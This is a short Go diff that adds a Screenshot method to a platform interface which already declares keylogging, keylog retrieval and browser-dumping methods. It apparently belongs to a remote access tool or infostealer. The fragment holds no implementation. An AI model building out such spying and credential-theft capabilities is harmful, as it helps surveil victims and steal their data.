@@ -8,6 +8,7 @@ type Platform interface {
 	StartKeylogger()
 	GetKeylogs() string
 	DumpBrowsers() string
+	Screenshot() ([]byte, error)
 }
 
 // NewPlatform returns a new platform-specific implementation of the Platform interface.
